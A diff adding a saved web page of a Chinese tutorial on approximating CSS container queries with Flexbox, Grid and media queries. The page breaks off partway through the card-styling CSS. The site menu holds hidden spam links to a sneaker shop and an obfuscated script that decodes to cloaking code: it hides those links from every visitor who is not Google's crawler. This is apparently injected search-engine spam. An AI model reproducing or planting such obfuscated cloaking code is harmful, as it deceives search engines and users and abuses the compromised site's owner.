@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<!-- saved from url=(0183)https://www.w3cplus.com/css/modern-web-technologies-take-us-a-step-further-from-container-queries.html?expire=1699762392&code=U3VNHbFcx-0&sign=8715c12d4e4a37e5784da684715a0e98#paywall -->
+<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
+<meta name="description" content="十年前的 [**CSS 媒体查询**](//www.w3cplus.com/blog/tags/49.html) 特性给 Web设计和开发带来新的变革，十年后的今天，[**CSS的容器查询**](//www.w3cplus.com/blog/tags/719.html) 给 Web 设计和开发又进一步的带来质的变革。虽然CSS容器查询特性很强大，但它还只是部分主流浏览器的实验属性。因此要用到生产中还有要能要走一段漫长的路。不过，庆幸的是，现代的一些 Web">
+<meta name="keywords" content="前端,CSS, 容器查询, Grid, Flexbox, Responsive, Layout, 会员专栏,教程">
+<meta name="generator" content="Drupal 7 (http://drupal.org)">
+<link rel="canonical" href="https://www.w3cplus.com/css/modern-web-technologies-take-us-a-step-further-from-container-queries.html">
+<link rel="shortlink" href="https://www.w3cplus.com/node/2764">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta itemprop="name" content="W3cplus">
+  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
+  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
+  <meta name="applicable-device" content="pc,mobile">
+  <title>现代Web技术让我们离容器查询更近一步_CSS, 容器查询, Grid, Flexbox, Responsive, Layout, 会员专栏 教程_W3cplus</title>
+  <link type="text/css" rel="stylesheet" href="./现代Web技术让我们离容器查询更近一步_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
+<link type="text/css" rel="stylesheet" href="./现代Web技术让我们离容器查询更近一步_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
+<link type="text/css" rel="stylesheet" href="./现代Web技术让我们离容器查询更近一步_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
+<link type="text/css" rel="stylesheet" href="./现代Web技术让我们离容器查询更近一步_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
+  <script src="./现代Web技术让我们离容器查询更近一步_files/hm.js.下载"></script><script type="text/javascript" src="./现代Web技术让我们离容器查询更近一步_files/jquery.min.js.下载"></script>
+
+</head>
+<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2764 node-type-blog" style="">
+  <div id="skip-link">
+    <a href="https://www.w3cplus.com/css/modern-web-technologies-take-us-a-step-further-from-container-queries.html?expire=1699762392&amp;code=U3VNHbFcx-0&amp;sign=8715c12d4e4a37e5784da684715a0e98#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
+  </div>
+    <div id="header" role="header">
+  <div class="container">
+    <h1 id="logo">
+      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
+    </h1>
+    <div class="toggle-topbar menu-icon" id="pull">
+      <a href="https://www.w3cplus.com/css/modern-web-technologies-take-us-a-step-further-from-container-queries.html?expire=1699762392&amp;code=U3VNHbFcx-0&amp;sign=8715c12d4e4a37e5784da684715a0e98#"><span>Menu</span></a>
+    </div>
+    <div class="toogle-topbar-content" id="pull-menu">
+              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfedavshop/air-jordan-1-mid-gs-white-medium-soft-pink-fierce-pink-fd8780-116-release-date/" title="SBD - 600 Mid GS Medium Soft Pink FD8780 , NIKE◆AIR JORDAN 5 RETRO TORO BRAVO 27.5cm RED DD0587 - 116 - NIKE◆AIR JORDAN 5 RETRO TORO BRAVO 27.5cm RED DD0587-600
+" style="display: none;">SBD - 600 Mid GS Medium Soft Pink FD8780 , NIKE◆AIR JORDAN 5 RETRO TORO BRAVO 27.5cm RED DD0587 - 116 - NIKE◆AIR JORDAN 5 RETRO TORO BRAVO 27.5cm RED DD0587-600
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfebadrshop/collections/nike/products/nike-air-jordan-1-mid-summer-heat-554724133" title="what to wear with the air jordan 1 mid se coconut milk particle grey - hamburger - ui
+" style="display: none;">what to wear with the air jordan 1 mid se coconut milk particle grey - hamburger - ui
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-max-97/" title="Latest Nike Air Max 97 Trainer Releases &amp; Next Drops , Nike Air Jordan Retro I High OG Black Metallic Gold 2020 , IetpShops
+" style="display: none;">Latest Nike Air Max 97 Trainer Releases &amp; Next Drops , Nike Air Jordan Retro I High OG Black Metallic Gold 2020 , IetpShops
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejcashop/" title="Air Jordan 1 Outlet Store online
+" style="display: none;">Air Jordan 1 Outlet Store online
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfebcenshop/release-reminder-nike-kobe-viii-8-black-history-month/" title="Nike SF Air Force 1 Mid Ivory Olive917753-101 , IetpShops , Release Reminder: Nike Kobe VIII (8) &#39;Black History Month&#39;
+" style="display: none;">Nike SF Air Force 1 Mid Ivory Olive917753-101 , IetpShops , Release Reminder: Nike Kobe VIII (8) 'Black History Month'
+</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
+<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
+<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
+          </div>
+  </div>
+</div>
+
+  <div id="branding" role="branding">
+    <div class="container">
+        <div class="region region-branding">
+    <div id="block-block-46" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;">
+	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./现代Web技术让我们离容器查询更近一步_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="page" role="page">
+  <div class="container">
+    
+    <div class="col-main">
+      <div class="main-wrap">
+        
+                
+        <div class="page-inner">
+                      <div id="breadcrumb" role="breadcrumb">
+              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
+          
+          
+          <a id="main-content"></a>
+                                <h1 class="title" id="page-title">
+              现代Web技术让我们离容器查询更近一步            </h1>
+          
+                    
+                                <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div id="node-2764" class="node node-blog node-promoted node-full clearfix" about="/css/modern-web-technologies-take-us-a-step-further-from-container-queries.html" typeof="sioc:Post sioct:BlogPost">
+  
+  <div class="node-header">
+              <div class="submitted">
+          作者：<span>大漠</span>          日期：<span>2021-11-17</span>          点击：<span>984</span>        </div>
+            <div class="tags">
+        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/68.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/719.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">容器查询</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/356.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Grid</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/157.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Flexbox</a></div><div class="field-item even"><a href="https://www.w3cplus.com/responsive" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Responsive</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
+  </div>
+
+  
+  <div class="body-content clearfix">
+    <div id="block-block-22" class="block block-block">
+
+    
+  <div class="content">
+    <div>
+<blockquote>
+<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
+</blockquote>
+</div>  </div>
+</div>
+<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><p>十年前的 <a href="https://www.w3cplus.com/blog/tags/49.html" target="_blank"><strong>CSS 媒体查询</strong></a> 特性给 Web设计和开发带来新的变革，十年后的今天，<a href="https://www.w3cplus.com/blog/tags/719.html" target="_blank"><strong>CSS的容器查询</strong></a> 给 Web 设计和开发又进一步的带来质的变革。虽然CSS容器查询特性很强大，但它还只是部分主流浏览器的实验属性。因此要用到生产中还有要能要走一段漫长的路。不过，庆幸的是，现代的一些 Web 技术（比如，<a href="https://www.w3cplus.com/blog/tags/157.html" target="_blank">Flexbox</a>、<a href="https://www.w3cplus.com/blog/tags/356.html" target="_blank">Grid</a>、<a href="https://www.w3cplus.com/blog/tags/49.html" target="_blank">媒体查询</a>和<a href="https://www.w3cplus.com/css/min-max-clamp-function.html" target="_blank">比较函数</a>等）让我们离容器查询特性更近一步。今天我们来看看，这些现代Web技术是如何让我们离容器查询更近一步。</p>
+
+<h2 class="content-title" data-index="2">背景</h2>
+
+<p>通过《<a href="https://www.w3cplus.com/css/container-queries.html" target="_blank">初探CSS容器查询</a>》和《<a href="https://www.w3cplus.com/css/container-queries-with-container-and-at-container.html" target="_blank">容器查询中的 <code>container</code> 和 <code>@container</code></a>》两篇文章中可以获知：</p>
+
+<blockquote>
+  <p>广大Web设计师和开发者所期待的、真正的CSS容器查询已经离我们越来越近了。</p>
+</blockquote>
+
+<p>真正的CSS容器查询是 CSS 全新的特性，但也是对媒体查询的补充，他和媒体查询最大的差异是：<strong>CSS媒体查询是基于浏览器视窗宽度或媒体特性来做条件判断；CSS容器查询是于容器尺寸、样式或状态等条件来做判断</strong>。</p>
+
+<p>对于Web开发者而言，在为Web构建组件时，并不总是知道该组件将被如何使用。也许它会和浏览器的视窗一样宽；也许有是一排二；也许它将被放在某个狭窄的栏目中（比如侧边栏）。它的宽度并不总是与浏览器视窗宽度相关。通常情况下，如果能对组件的CSS进行基于容器的查询，将是非常的方便的。也就是说，如果组件能够让你基于容器的尺寸做出响应，而不是基于视窗尺寸做出响应，这对于基于组件的设计是非常有帮助的，因为你不再需要为同一组件创建该组件的变体。</p>
+
+<p>针对于这样的场景，你可能首先会想到 CSS 的一些现代布局技术，比如使用 Flexbox、Grid 或者一些CSS函数，我们可以创建响应容器和内容宽度的样式，并克服容器查询所要解决的一些痛点。但它们之间还是有着本质的差异。接下来我们就来一起探讨这方面的差异。</p>
+
+<h2 class="content-title" data-index="2">问题所在</h2>
+
+<p>我们从实际需求出发。我想大家平时在开发的时候，应该碰到像下图这样的需求：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-1.jpg" alt=""></p>
+
+<p>正如上图所示：</p>
+
+<ul>
+<li>视窗变窄，窄到一行只能放置一个卡片时（想象在移动端），三个卡片在垂直方向堆叠（从上往下，一个一个）放置，但它们向用户呈现的效果是一致的</li>
+<li>视窗变宽，但没有足够空间一排容纳三个卡片时，第三个卡片会换行，并且在 UI 的呈现上也与其他卡片不同（它可以是故意的），你可以认为第三个卡片是特别的（卡片的变体）</li>
+<li>视窗有足够宽的空间或卡片容器有足够宽的空间，卡片一排三</li>
+</ul>
+
+<p>请不要在意这样设计的原因和理由。我们现在要考虑的是如何跳过这个中间的布局状态，直接从垂直堆叠（从上往下，一个一个放置）切换到水平一排三（从左向右，一个一个放置）？有什么办法呢？</p>
+
+<p>或许你会说，使用 CSS 媒体查询很容易就能做到，使用 <code>@media</code> 在不同的断点下为卡片组件提供不同的 UI样式。</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-2.jpg" alt=""></p>
+
+<p>甚至可能还有更多的断点查询，比如在大的显示器上，为了让示例不那么复杂，只要是大于 <code>768px</code> 断点的，卡片都是一排三的水平放置：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-3.jpg" alt=""></p>
+
+<p>看上去是OK的？事实呢？或许并不是这样的。因为，CSS <code>@media</code> 断点是设计系统的大忌。我们构建的 Web 组件（比如这个卡片组件），在上下文之外定义，可以在任何宽度的容器（父元素或其祖先元素）中实例化。上下文是可变的，但<code>@media</code>查询（断点查询）所能做的是根据浏览器视窗宽度这个常数来调整组件UI样式。</p>
+
+<p>简单地说，<strong>对于Web组件来说，媒体查询是一种错误，因为我们永远不知道Web组件的大小</strong>。我们用下面这张图来展示这个问题：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-4.jpg" alt=""></p>
+
+<p>要解决这个问题，CSS媒体查询是无法做到的，只有容器查询才能实现。</p>
+
+<h2 class="content-title" data-index="2">使用现代Web技术创建响应容器或内容宽度的样式</h2>
+
+<p>文章开头提到，针对于这样的场景，你可能会想到一些现代Web布局技术，比如 <a href="https://www.w3cplus.com/blog/tags/157.html" target="_blank">Flexbox</a>、<a href="https://www.w3cplus.com/blog/tags/356.html" target="_blank">Grid布局</a>，甚至你还会想到使用 <a href="https://www.w3cplus.com/css/css-functions-guide.html" target="_blank">CSS 函数</a>中的<a href="https://www.w3cplus.com/css/min-max-clamp-function.html" target="_blank">比较函数</a>、<a href="https://www.w3cplus.com/css/css-functions-guide.html" target="_blank">数学四则运算</a> 和 <a href="https://www.w3cplus.com/css/dynamism-and-css-calculations.html" target="_blank">CSS的动态计算</a>等技术创建响应容器和内容宽度的样式。</p>
+
+<p>我们的示例将以三个卡片的布局为例，构建这个示例我们需要的 HTML 结构如下：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">img</span></span> <span class="attribute"><span class="attribute">src</span></span>=<span class="value"><span class="value">"https://picsum.photos/2568/600?random=1"</span></span> <span class="attribute"><span class="attribute">width</span></span>=<span class="value"><span class="value">"2568"</span></span> <span class="attribute"><span class="attribute">height</span></span>=<span class="value"><span class="value">"600"</span></span> <span class="attribute"><span class="attribute">alt</span></span>=<span class="value"><span class="value">""</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card__thumbnail"</span></span> /&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card__badge"</span></span>&gt;</span></span>Must Try<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h3</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card__title"</span></span>&gt;</span></span>Best Brownies in Town<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h3</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card__describe"</span></span>&gt;</span></span>High quality ingredients and best in-class chef. Light, tender, and easy to make~<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">button</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card__button"</span></span>&gt;</span></span>Order now<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">button</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<blockquote>
+  <p>注意，如果没有特别声明，后面的示例都将以这个 HTML 作为示例所需的 DOM 结构。</p>
+</blockquote>
+
+<p>为了省事，单张卡片的使用 <a href="https://www.w3cplus.com/blog/tags/356.html" target="_blank">CSS Grid 来布局</a>，并且添加一点CSS来美化卡片：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border-radius</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">12</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">background-color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#fff</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#454545</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">box-shadow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0.35</span></span>em <span class="number"><span class="number">0</span></span> <span class="function"><span class="function">rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / <span class="number"><span class="number">0.5</span></span>)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card__thumbnail</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">aspect-ratio</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">16</span></span> / <span class="number"><span class="number">9</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">object-fit</span></span></span><span class="rule">:<span class="value"><span class="value"> cover;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">object-position</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border-radius</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">12</span></span>px <span class="number"><span class="number">12</span></span>px <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">z-index</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card__badge</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">z-index</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">background-color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#2196f3</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border-radius</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">10</span></span>rem <span class="number"><span class="number">10</span></span>rem <span class="number"><span class="number">0</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin-top</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#fff</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">5</span></span>px <span class="number"><span class="number">12</span></span>px <span class="number"><span class="number">5</span></span>px <span class="number"><span class="number">8</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">text-shadow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">1</span></span>px <span class="function"><span class="function">rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / <span class="number"><span class="number">0.5</span></span>)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">filter</span></span></span><span class="rule">:<span class="value"><span class="value"> drop-<span class="function"><span class="function">shadow(<span class="number"><span class="number">0</span></span>px <span class="number"><span class="number">0</span></span>px <span class="number"><span class="number">2</span></span>px rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / <span class="number"><span class="number">0.5</span></span>)</span></span>);</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card__title</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-weight</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">700</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-size</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">clamp(<span class="number"><span class="number">1.2</span></span>rem, <span class="number"><span class="number">1.2</span></span>rem + <span class="number"><span class="number">3</span></span>vw, <span class="number"><span class="number">1.5</span></span>rem)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">20</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">white-space</span></span></span><span class="rule">:<span class="value"><span class="value"> nowrap;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">text-overflow</span></span></span><span class="rule">:<span class="value"><span class="value"> ellipsis;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">overflow</span></span></span><span class="rule">:<span class="value"><span class="value"> hidden;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card__describe</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#666</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">line-height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1.4</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">20</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> -webkit-box;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">-webkit-box-orient</span></span></span><span class="rule">:<span class="value"><span class="value"> vertical;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">-webkit-line-clamp</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
